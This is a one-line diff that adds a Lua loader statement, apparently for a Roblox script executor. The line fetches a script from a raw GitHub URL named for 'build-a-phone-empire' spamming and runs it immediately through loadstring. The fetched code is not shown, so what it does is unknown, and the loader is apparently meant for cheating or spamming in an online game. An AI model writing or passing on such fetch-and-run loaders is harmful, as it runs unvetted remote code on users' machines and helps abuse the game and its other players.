@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/build-a-phone-empire-spam4-74zv5fhrib2ac9.lua"))()
